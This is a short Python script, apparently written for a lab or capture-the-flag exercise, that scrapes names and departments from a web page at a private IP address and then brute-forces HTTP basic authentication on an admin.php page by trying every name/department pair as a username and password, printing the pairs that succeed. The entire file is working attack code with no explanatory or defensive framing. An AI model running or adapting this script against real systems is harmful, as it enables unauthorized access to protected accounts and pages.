#!/bin/python3

import requests
from bs4 import BeautifulSoup

def download_page(url):
	r = requests.get(url)
	page = r.content
	return page
	
def get_names(page):
	parser = BeautifulSoup(page, "html.parser")
	tags = parser.find_all("td", id="name")
	names = [tag.text for tag in tags]
	return names
	
def get_depts(page):
	parser = BeautifulSoup(page, "html.parser")
	tags = parser.find_all("td", id="department")
	depts = [tag.text for tag in tags]
	return depts
	
def get_auth(url, uname, passwd):
	r = requests.get(url, auth=(uname, passwd))
	if str(r.status_code) != '401': 
		print (f"\nUsername: {uname} Password: {passwd} Code: {r.status_code}\n")
	
page = download_page("http://172.16.120.120")

names = get_names(page)
uniqNames = sorted(set(names))

depts = get_depts(page)
uniqDepts = sorted(set(depts))

print("[+] Working... ")
for name in uniqNames:
    for dept in uniqDepts:
        get_auth("http://172.16.120.120/admin.php", name, dept)
        
        
